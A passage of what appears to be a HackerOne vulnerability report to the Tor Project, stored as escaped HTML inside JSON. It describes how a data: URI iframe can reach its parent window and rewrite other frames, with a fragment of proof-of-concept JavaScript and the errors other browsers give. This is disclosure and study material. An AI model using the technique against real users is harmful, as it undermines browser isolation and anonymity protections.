<span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">appendChild</span><span class=\"p\">(</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">createElement</span><span class=\"p\">(</span><span class=\"s1\">&#39;iframe&#39;</span><span class=\"p\">))</span>\n        <span class=\"nx\">y</span><span class=\"p\">.</span><span class=\"nx\">src</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;data:text/html,datauri 5001&#39;</span>\n    <span class=\"nt\">&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>The iframe from 5000 port could rewrite an iframe in a different origin, but it doesn&#39;t have access to &quot;parent&quot; at 5001 port, so direct UXSS is impossible.</p>\n\n<blockquote>\n<p>Also, there is an interesting case described in PoC. Function in the iframe from port 5000 called twice in different contexts. </p>\n</blockquote>\n\n<h2 id=\"expected-behavior\">Expected behavior</h2>\n\n<h3 id=\"1-in-latest-chrome-firefox-safari-iframe-with-data-uri-has-null-origin-and-can-t-access-parent-window-s-location\">1. In latest Chrome, Firefox, Safari iframe with <code>data:</code> uri has <code>null</code> origin and can&#39;t access parent window&#39;s location.</h3>\n\n<p>PoC in Chrome/FF/Safari throws error:</p>\n<pre class=\"highlight plaintext\"><code>SecurityError: Blocked a frame with origin &quot;null&quot; from accessing a frame with origin &quot;http://127.0.0.1:5000&quot;.  The frame requesting access has a protocol of &quot;data&quot;, the frame being accessed has a protocol of &quot;http&quot;. Protocols must match.\n</code></pre>\n<h3 id=\"2-iframe-can-t-rewrite-another-iframe-s-content-via-data-uri\">2. iframe can&#39;t rewrite another iframe&#39;s content via data uri.</h3>\n\n<p>Same as in the 1 case.</p>\n<pre class=\"highlight plaintext\"><code>SecurityError: Permission denied to access property &quot;href&quot; on cross-origin object\n</code></pre>\n<h3 id=\"3\">3.</h3>\n\n<p>FF</p>\n<pre class=\"highlight plaintext\"><code>NS_ERROR_DOM_PROP_ACCESS_DENIED: Access to property denied\n</code></pre>\n<p>Chrome/Safari</p>\n<pre class=\"highlight plaintext\"><code>Unsafe JavaScript attempt to initiate navigation for frame with URL...\nSecurityError: The operation is insecure.\n</code></pre>\n<h2 id=\"impact\">Impact</h2>\n\n<p>Partial SOP violation. <br>\nDirect UXSS seems impossible, but described behavior opens a wide range of attack scenarios.</p>\n\n<ol>\n<li>Any malicious iframe src=<code>data:uri</code> could access parent</li>\n<li>Any malicious iframe src=<code>data:uri</code> could rewrite other frames&#39;s location (to data:uri too) in DOM using <code>parent.window.frames</code>\n</li>\n</ol>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.torproject.org/", 
+            "about": "Anonymity Online", 
+            "twitter_handle": "torproject", 
+            "name": "Tor"
+        }, 
+        "handle": "torproject", 
+        "url": "https://hackerone.com/torproject", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/001/800/fe36670e5f7b7381549279801c447ae8a3ee12b0_small.jpg?1453239375", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/001/800/f60c4e0509668a31fcd9604fc653ef8a43f2e5c4_medium.jpg?1453239375"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 1800, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
